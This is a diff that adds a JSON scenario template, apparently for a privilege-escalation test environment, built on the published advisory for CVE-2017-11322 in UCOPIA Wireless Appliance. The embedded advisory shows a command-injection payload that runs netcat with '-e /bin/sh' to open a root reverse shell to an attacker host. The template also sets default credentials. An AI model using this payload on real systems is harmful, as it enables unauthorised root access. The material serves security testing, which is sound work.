@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_42936",
+  "category": "A2_sudo",
+  "attack_technique": "T1548.003",
+  "cwe": "CWE-269",
+  "description": "Linux privilege escalation: UCOPIA Wireless Appliance < 5.1.8 - Local Privilege Escalation (CVE-2017-11322)\n\nExploit source code (42936.md):\n```\n# [CVE-2017-11322] UCOPIA Wireless Appliance < 5.1.8 Privileges Escalation\n\n## Asset description\n\nUCOPIA solutions bring together a combination of software, appliance and cloud services serving small to large customers.\n\nMore than 12,000 UCOPIA solutions are deployed and maintained by UCOPIA expert partners all over the world.\n\nThe affected asset in this report is a WiFi management appliance.\n\n## Vulnerability\n\nCHROOT escape and privileges escalation.\n\n**Threat**\n\nImproper sanitization of system commands in the chroothole_client executable in UCOPIA Wireless Appliance, prior to 5.1.8, allows local attackers to elevate privileges to root user and escape from the *chroot*.\n\n**CVE ID**: CVE-2017-11322\n\n**Access Vector**: local\n\n**Security Risk**: high\n\n**Vulnerability**: CWE-78\n\n**CVSS Base Score**: 8.2 (High)\n\n**CVSS Vector**: CVSS:3.0/AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H\n\n### Proof of Concept: chroot escape / privileges escalation\n\nThe **chroothole_client** binary is used by the appliance to run programs outside the *chroot*, as the **root** user.\n\nBecause of an improper sanitization of system commands, we managed to gain a complete **root** access to the appliance, outside the *chroot*.\n\n```\n$ chroothole_client '/usr/sbin/status'\nis not running ... failed !\n$ chroothole_client '/usr/sbin/status $(which nc)'\n/bin/nc is not running ... failed!\n$ chroothole_client '/usr/sbin/status $(nc 10.0.0.125 4444 -e /bin/sh)'\n```\n\nAttacker terminal :\n\n```\n$ ncat -lvp 4444\nNcat: Listening on 0.0.0.0:4444\nNcat: Connection from 10.0.0.1:49156.\nwhoami\nroot\n```\n\n## Solution\n\nUpdate to UCOPIA 5.1.8\n\n## Timeline (dd/mm/yyyy)\n\n* 08/03/2017 : Vulnerability discovery.\n* 03/05/2017 : Initial contact.\n* 10/05/2017 : GPG Key exchange.\n* 10/05/2017 : Advisory sent to vendor.\n* 17/05/2017 : Request for feedback.\n* 22/05/2017 : Vendor acknowledge the vulnerabilities.\n* 21/06/2017 : Sysdream Labs request for an ETA, warning for public disclosure.\n* 21/06/2017 : Vendor say that the UCOPIA 5.1.8 fixes the issue.\n* 29/09/2017 : Public disclosure.\n\n## Credits\n\n* Nicolas CHATELAIN, Sysdream (n.chatelain -at- sysdream -dot- com)\n\n--\nSYSDREAM Labs <labs@sysdream.com>\nGPG : 47D1 E124 C43E F992 2A2E 1551 8EB4 8CD9 D5B2 59A1\n* Website: https://sysdream.com/\n* Twitter: @sysdream\n```",
+  "cve": "CVE-2017-11322",
+  "exploitdb_id": "42936",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_42936",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
